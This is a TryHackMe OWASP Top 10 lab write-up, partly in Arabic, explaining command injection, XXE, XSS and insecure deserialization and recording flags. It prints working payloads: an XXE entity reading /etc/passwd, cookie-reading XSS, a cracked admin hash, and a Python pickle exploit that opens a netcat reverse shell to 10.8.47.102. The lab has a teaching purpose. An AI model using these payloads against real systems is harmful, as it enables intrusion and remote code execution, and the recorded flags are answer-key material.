# OWASP Top 10

<details>
  <summary>[Severity 1] Command Injection Practical</summary>

> What strange text file is in the website root directory?

```
$ ls
```

```
css
drpepper.txt
evilshell.php
index.php
js 
```

> How many non-root/non-service/non-daemon users are there?  how to know that in linux

```
getent passwd | awk -F: '$3 >= 1000 && $7 != "/usr/sbin/nologin" && $7 != "/bin/false" && $1 != "nobody" {print $1}' | wc -l
```

```
0
```

> What user is this app running as?

```
$ whoami
```

```
www-data 
```

> What is the user's shell set as?

```
getent passwd www-data | cut -d: -f7
```

> What version of Ubuntu is running?

```
$ cat /etc/os-release
```

```
18.04.4 
```

> Print out the MOTD.  What favorite beverage is shown?

```
$ cat drpepper.txt
```

```
I love Dr Pepper 
```

</details>


<details>
   <summary>[Severity 2] Broken Authentication Practical</summary>


> What is the flag that you found in darren's account?

- if you try to rigister using ``darren``
  - user already exist
- now register using ``darren   `` and login you will found the flag

> do same to ``auther``





  
</details>



<details>
  <summary>[Severity 3] Sensitive Data Exposure (Challenge)</summary>

![image](https://github.com/user-attachments/assets/3998c50c-5e62-4c36-9e2d-d57e48981a08)


![image](https://github.com/user-attachments/assets/c32a4e6e-078b-4396-a759-683fd515eff1)


![image](https://github.com/user-attachments/assets/8f486f43-09ad-414f-b40a-2c12b57fd2de)

```
��������tablesessionssessionsCREATE TABLE sessions(
sessionID TEXT NOT NULL UNIQUE,
userID TEXT NOT NULL,
expiry INT NOT NULL,
PRIMARY KEY (sessionID))/Cindexsqlite_autoindex_sessions_1sessions�*�'�-tableusersusersCREATE TABLE users(
userID TEXT NOT NULL UNIQUE,
username TEXT NOT NULL UNIQUE,
password TEXT NOT NULL,
admin INT NOT NULL,
�h��GKHMMEY(user23023b67a32488588db1e28579ced7ecBobad0234829205b9033196ba818f7a872bJM4e8423b514eef575394ff78caed3254dAlice268b38ca7b84f44fa0a6cdc86e6301e0JMM   4413096d9c933359b898b6202288a650admin6eea9b7ef19179a06954edd0f6c05ceb
����mH%%$M23023b67a32488588db1e28579ced7ec$M4e8423b514eef575394ff78caed3254d#M  4413096d9c933359b898b6202288a650
�J����  Bob     Alice   admin
�$                              
```
> admin password hash is

```
6eea9b7ef19179a06954edd0f6c05ceb
```

> crack it on crackstation

```
qwertyuiop
```

```
THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}
```


</details>



<details>
    <summary>[Severity 4 XML External Entity - eXtensible Markup Language</summary>

## 📏 القواعد المهمة في كتابة XML (Syntax Rules)

| القاعدة                                          | الشرح                                                |
| ------------------------------------------------ | ---------------------------------------------------- |
| 🔸 كل XML لازم يكون عنده عنصر جذر (Root Element) | مثل `<data>...</data>`                               |
| 🔸 XML حساس لحالة الأحرف                         | `<To>` ≠ `<to>`                                      |
| 🔸 لازم تغلق كل العناصر                          | `<tag></tag>` أو باستخدام self-closing مثل `<tag />` |
| 🔸 القيم النصية يجب أن تُحاط بعلامات اقتباس      | `<tag attr="value">`                                 |
| 🔸 لا يوجد عناصر غير مغلقة مثل HTML              | (ما في `<br>` بس في `<br/>`)                         |




## 📋 مثال شامل:

```
<?xml version="1.0" encoding="UTF-8"?>
<bookstore>
  <book category="programming">
    <title lang="en">Learn XXE</title>
    <author>Cyber Falcon</author>
    <year>2025</year>
    <price>0.00</price>
  </book>
</bookstore>
```

---

📎 DTD (Document Type Definition)
هنا يبدأ الموضوع يكون خطير، لأننا راح نستخدم DTD في استغلال XXE لاحقًا.

إيش هو DTD؟
هو تعريف هيكل وهيئة المستند XML، ويقدر يحتوي على:

تعريف العناصر

السماح بالكيانات الخارجية (External Entities)

مثال DTD داخلي:


```
<!DOCTYPE mail [
  <!ELEMENT mail (to, from, subject, text)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT subject (#PCDATA)>
  <!ELEMENT text (#PCDATA)>
]>
```


☠️ لكن هنا الخطورة:
DTD يسمح بتعريف كيان خارجي External Entity زي كذا:



```
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```

----

![image](https://github.com/user-attachments/assets/ef843c7a-364d-49dd-b57b-241504ee501b)


--- ---
---
---

🧱 مثال توضيحي:
ملف DTD داخلي:

```
<!DOCTYPE note [
  <!ELEMENT note (to,from,heading,body)>
  <!ELEMENT to (#PCDATA)>
  <!ELEMENT from (#PCDATA)>
  <!ELEMENT heading (#PCDATA)>
  <!ELEMENT body (#PCDATA)>
]>
```

XML يستند عليه:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
    <to>falcon</to>
    <from>feast</from>
    <heading>hacking</heading>
    <body>XXE attack</body>
</note>
```

🧠 شرح مفصل لكل سطر في DTD:

| السطر                                    | المعنى                                                                               |
| ---------------------------------------- | ------------------------------------------------------------------------------------ |
| `<!DOCTYPE note [...]>`                  | يعرّف أن الجذر (Root Element) اسمه `note`                                            |
| `<!ELEMENT note (to,from,heading,body)>` | عنصر `note` لازم يحتوي بالترتيب على العناصر الأربعة: `to`, `from`, `heading`, `body` |
| `<!ELEMENT to (#PCDATA)>`                | العنصر `to` يحتوي بيانات نصية قابلة للقراءة (Character Data)                         |
| `#PCDATA`                                | اختصار لـ: **Parsed Character Data** → يعني نص يتم تفسيره                            |
| باقي العناصر (`from`, `heading`, `body`) | كلهم زي `to`، يحتوي بيانات نصية فقط                                                  |



🔎 أنواع البيانات في DTD:

| النوع      | الشرح                        |                                    |
| ---------- | ---------------------------- | ---------------------------------- |
| `#PCDATA`  | بيانات نصية قابلة للتحليل    |                                    |
| `EMPTY`    | العنصر لا يحتوي على أي محتوى |                                    |
| `ANY`      | العنصر ممكن يحتوي على أي شيء |                                    |
| \`(#PCDATA | element)\*\`                 | محتوى مختلط، ممكن يكون نص أو عناصر |



📦 أنواع DTD:


| النوع            | الوصف                                                |
| ---------------- | ---------------------------------------------------- |
| **Internal DTD** | يُكتب داخل ملف XML نفسه                              |
| **External DTD** | يُخزّن في ملف خارجي (`note.dtd`) ويتم ربطه بـ SYSTEM |



مثال ربط DTD خارجي:


```
<!DOCTYPE note SYSTEM "note.dtd">
```

🎯 ليش نستخدم DTD؟

- نتأكد أن ملف XML صحيح وصالح

- يسهل التعامل بين الأنظمة المختلفة

- أساس مهم في التحقق من الصيغة قبل استخدام XML في البرمجة أو المعالجة






## 🚨 ملاحظة أمان:
> لأن DTD يسمح بكيانات خارجية (<!ENTITY ... SYSTEM ...>)، نقدر نستغلها في هجمات XXE، وهذا بالضبط الي راح ندخله بعد ما نخلص الأساسيات.





![image](https://github.com/user-attachments/assets/c103f572-64be-44ed-8cde-fd16dffc6237)

---
---
---



🧪 أولًا: Payload بسيط (تعريف كيان داخلي)
💻 الكود:

```
<!DOCTYPE replace [
  <!ENTITY name "feast">
]>
<userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
</userInfo>
```

🔍 الشرح:
<!ENTITY name "feast"> ← بنعرّف كيان اسمه name وقيمته "feast".

&name; ← بنستخدم الكيان داخل العنصر <lastName>.

📌 النتيجة بعد تفسير XML:

```
<userInfo>
  <firstName>falcon</firstName>
  <lastName>feast</lastName>
</userInfo>
```

✅ ده مثال تعليمي على إزاي XML ممكن يستخدم كيانات (Entities)، لكن ما فيهوش اختراق.



---


💣 ثانيًا: Payload حقيقي لاستغلال XXE لقراءة ملفات
💻 الكود:

```
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY read SYSTEM "file:///etc/passwd">
]>
<root>&read;</root>
```

🔍 الشرح:
<!ENTITY read SYSTEM "file:///etc/passwd"> ← هنا بنعرّف كيان خارجي (External Entity) بياخد قيمة محتوى ملف من السيرفر.

&read; ← بيتم استدعاء الكيان داخل العنصر <root>.

📌 لو التطبيق فيه ثغرة XXE ومش عامل الحماية اللازمة:

الكود ده هيخلي التطبيق يفتح ملف /etc/passwd من نظام التشغيل ويعرضه لك!

``📂 /etc/passwd``:

هو ملف في نظام لينوكس يحتوي على معلومات المستخدمين، وغالبًا ما يُستخدم لاختبار وجود الثغرة.



⚠️ ملاحظات مهمة:

1- ✅ لازم التطبيق يسمح بقراءة DTD أو ما يكون فيه الحماية (زي منع الكيانات الخارجية).

2- ❌ لو التطبيق عامل hardening (زي في Java أو PHP الحديثة)، ممكن البايلود ما يشتغل.

3- 🔒 بعض الملفات ممكن تكون مقفولة أو require root access، فقراءتها هتفشل.



🎯 خلاصة:


| النوع               | الشرح                               | مثال                                         |
| ------------------- | ----------------------------------- | -------------------------------------------- |
| **Internal Entity** | كيان داخلي بقيمة ثابتة              | `<!ENTITY name "feast">`                     |
| **External Entity** | كيان بيروح يقرأ من ملف أو URL خارجي | `<!ENTITY read SYSTEM "file:///etc/passwd">` |





![image](https://github.com/user-attachments/assets/2a9efdc7-aa39-447e-9033-a32ff99570e3)



![image](https://github.com/user-attachments/assets/ec86f674-36f1-4b6b-83a8-ae0ce0b50105)

![image](https://github.com/user-attachments/assets/5cff94f1-2320-4729-8c58-96f05ba90a33)






   
</details>







<details>
  <summary>[Severity 5] Broken Access Control</summary>


![image](https://github.com/user-attachments/assets/43c12a69-d4e0-474c-96d8-da456d3ee971)





</details>



<details>
  <summary>[Severity 6] Security Misconfiguration</summary>


![image](https://github.com/user-attachments/assets/887466f1-854d-4700-b280-6adcc500f8aa)

![image](https://github.com/user-attachments/assets/7fb4eaac-2932-4fad-8f0d-eb4f871f48f5)


![image](https://github.com/user-attachments/assets/68a62ce1-fd7c-4ae7-bc98-250cb8f8dbe7)


</details>




<details>
  <summary>[Severity 7] Cross-site Scripting</summary>


![image](https://github.com/user-attachments/assets/22b11381-3913-455e-8e46-66d3107f048f)

``payload``

```
(<script>alert(“Hello”)</script>)
```

```
ThereIsMoreToXSSThanYouThink
```

![image](https://github.com/user-attachments/assets/57694080-3c94-4a8b-b669-2183cad419b8)


--- 

``payload``

```
<script>alert(window.location.hostname)</script>
```

```
ReflectiveXss4TheWin
```

![image](https://github.com/user-attachments/assets/e5a528ee-c948-4703-ad1a-ed054c5bba65)





---

![image](https://github.com/user-attachments/assets/ceb2c310-751e-4087-8007-4921572e8143)

``payload``

```
<img src="invalid-image" onerror="alert('Stored XSS!')">
```

```
HTML_T4gs
```

---



``payload``

```
<script>alert(document.cookie)</script>
```

```
W3LL_D0N3_LVL2
```

![image](https://github.com/user-attachments/assets/470ef965-7445-4e83-b3e1-b05e86355c72)


---



``payload``

```
<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
```

```
websites_can_be_easily_defaced_with_xss
```

![image](https://github.com/user-attachments/assets/8264f9e1-63c4-41ca-ba2c-e925c46b70a0)






  
</details>



<details>
  <summary>[Severity 8] Insecure Deserialization</summary>


<details>

🔐 إيه هي Insecure Deserialization؟
Deserialization معناها:
تحويل البيانات المخزنة في شكل ملف (زي JSON، أو Binary) إلى كائن (Object) في البرنامج عشان يشتغل عليه.

Insecure Deserialization يعني إن الهاكر يقدر يغير البيانات دي (اللي هتتحول لـ Object) ويحط فيها كود خبيث، وبعدين التطبيق ينفذه وهو فاكر إن دي بيانات عادية.

🧠 تخيل معايا السيناريو:
التطبيق بيبعت Object مشفّر للمستخدم (زي user settings).

المستخدم يعدل البيانات ويرجعها.

التطبيق يفك التشفير (deserialize) ويستخدمها مباشرة بدون تحقق.

لو المستخدم حاطت كود خبيث... التطبيق يشغّله 😱


----

----
----
---

في البرمجة الكائنية (OOP)، الكائن (Object) بيتكوّن من:

State (الحالة): يعني هو "عامل إزاي دلوقتي"، أو "شكله/قيمه".

Behaviour (السلوك): يعني "هو بيعمل إيه"، أو "الوظائف اللي بيقدر يعملها".




---
----
----
---

🔄 إيه هو الـ Serialization / Deserialization؟
خلينا نبدأ بالتشبيه الأول:

👤 السياح والخرائط:
تخيل سائح ضايع في بلدك، وبيسألك على طريق معلم مشهور. المشكلة؟ هو مش بيتكلم لغتك، وانت مش فاهم لغته. فإيه الحل؟
ترسم له خريطة 👣 — لأن الصور مفهومة لأي شخص، وفعلاً قدر يوصل!

🎯 في المثال ده:

إنت رسمت خريطة = Serialization ➡️ حولت معلومات (الطريق) إلى شكل بسيط (الخريطة).

السائح فهم الخريطة = Deserialization ➡️ رجّع الخريطة لمعلومة مفهومة (الطريق الحقيقي).

🧠 طب ده معناه إيه في البرمجة؟
🔹 Serialization:
هي عملية تحويل كائن (Object) في البرنامج (مثلاً بيانات مستخدم، أو رسالة، أو باسورد) إلى صيغة مبسطة زي:

JSON

XML

Binary

والسبب؟ علشان تقدر:

ترسلها عبر الشبكة

تخزنها في قاعدة بيانات

🔹 Deserialization:
هي العملية العكسية، ترجّع البيانات المبسطة دي لكائن كامل تاني في البرنامج علشان تشتغل عليه.

🎯 مثال بسيط:
عندك باسورد: "password123"

قبل ما يتبعت لقواعد البيانات أو عبر الإنترنت، لازم يتحوّل لصيغة بسيطة (مثلاً binary أو JSON).

أول ما يوصل، يتفك تاني ويرجع "password123".

💀 فين المشكلة (Insecure Deserialization)؟
لو الـ deserialization حصل من غير تحقق من البيانات، ممكن الهاكر يبعَت بيانات فيها كود خبيث!
ولأن البرنامج بيثق في البيانات دي، هينفّذها زي ما هي 🔥

🚨 والنتائج ممكن تكون:
🧨 DoS: الموقع ينهار

👾 RCE (Remote Code Execution): الهاكر يشغل أوامر على السيرفر

🕳️ التطبيقات المعرّضة للخطر:
أي تطبيق بيخزن/يسترجع بيانات بدون تحقق كويس. أمثلة:

مواقع التجارة الإلكترونية

المنتديات

الـ APIs

أنظمة زي: Jenkins, Tomcat, JBoss



🧠 الخلاصة:

| المصطلح                  | معناه                                                                  |
| ------------------------ | ---------------------------------------------------------------------- |
| Serialization            | تحويل كائن لبيانات بسيطة (مثلاً JSON أو Binary) علشان يتخزن أو يتنقل.  |
| Deserialization          | تحويل البيانات البسيطة لكائن برمجي تاني نقدر نشتغل عليه.               |
| Insecure Deserialization | استغلال البيانات دي عشان ننفذ كود خبيث بسبب عدم وجود تحقق أو فحص سليم. |





----
----
----
----



🍪 إيه هي الـ Cookies؟
الكوكيز (Cookies) هي قطع صغيرة من البيانات بيخزنها الموقع على جهازك، والغرض منها هو تذكر معلومات عنك لما تتصفح أو ترجع للموقع تاني.

✅ ليه المواقع بتستخدم الكوكيز؟
بعض الاستخدامات الشائعة:
🛒 حفظ محتويات السلة (في مواقع الشراء).

🔐 حفظ بيانات الجلسة (session ID) بعد تسجيل الدخول.

🌐 تخصيص تجربتك على الموقع (مثلاً تفضل اللغة العربية؟ الكوكيز تعرف ده).

📈 تتبع نشاط المستخدم (لأغراض تحليلية وإعلانات).

⚠️ المشكلة في المثال اللي فوق:
الموقع بيخزن بيانات تسجيل الدخول بشكل نصّي عادي (plaintext) جوه الكوكيز 😱
ودي ثغرة أمنية خطيرة لأن أي حد يقدر يقرأها أو يسرقها بسهولة من المتصفح.

لكن مهم نوضح:
🔸 دي مش ثغرة Insecure Deserialization لأننا مش بنرسل كائنات متسلسلة (serialized objects) يتم تنفيذها بعد كده.
هي مجرد بيانات محفوظة بشكل غير آمن.

⏳ مدة صلاحية الكوكيز (Expiry):
مش كل الكوكيز بتفضل محفوظة دايمًا.

Session cookies: بتتحذف لما تقفل المتصفح.

Persistent cookies: بتفضل محفوظة لفترة، حسب التاريخ والوقت اللي بيتحدد في خاصية "Expiry".





⚙️ خصائص الكوكيز المهمة:


| الخاصية      | الوصف                                                       | مطلوب؟ |
| ------------ | ----------------------------------------------------------- | ------ |
| Cookie Name  | اسم الكوكي                                                  | ✔️ نعم |
| Cookie Value | القيمة اللي الكوكي بتخزنها (ممكن تكون نص، Base64، إلخ)      | ✔️ نعم |
| Secure Only  | لو اتفعلت، الكوكي ده هيتبعت فقط في الاتصالات الآمنة (HTTPS) | ❌      |
| Expiry       | الوقت اللي الكوكي هينتهي فيه ويتحذف من المتصفح              | ❌      |
| Path         | الكوكي ده هيتبعت فقط لو رابط الصفحة ضمن المسار المحدد       | ❌      |










  
</details>



![image](https://github.com/user-attachments/assets/ecf27e99-05da-4a48-80f0-660695602848)

change ``suertype`` to ``admin``

![image](https://github.com/user-attachments/assets/a00e66b5-9774-4844-b8c8-1412c5091bc2)

``sessionID``

```
gAN9cQAoWAkAAABzZXNzaW9uSWRxAVggAAAAMDEyOGVlMzZkYmY1NDE2N2E2YmRiN2IxYjllOTUxYjFxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg==
```

![image](https://github.com/user-attachments/assets/7a25b12c-b824-49a2-af98-0b558a8e6dfe)

```
THM{good_old_base64_huh}
```

---
---


![image](https://github.com/user-attachments/assets/7c64eb15-c87a-4f9f-a71d-8d9b7913b1e4)


```
import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat 10.8.47.102 4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))     
```

```
gASVdAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjFlybSAvdG1wL2Y7IG1rZmlmbyAvdG1wL2Y7IGNhdCAvdG1wL2YgfCAvYmluL3NoIC1pIDI+JjEgfCBuZXRjYXQgMTAuOC40Ny4xMDIgNDQ0NCA+IC90bXAvZpSFlFKULg==
```




  
</details>


























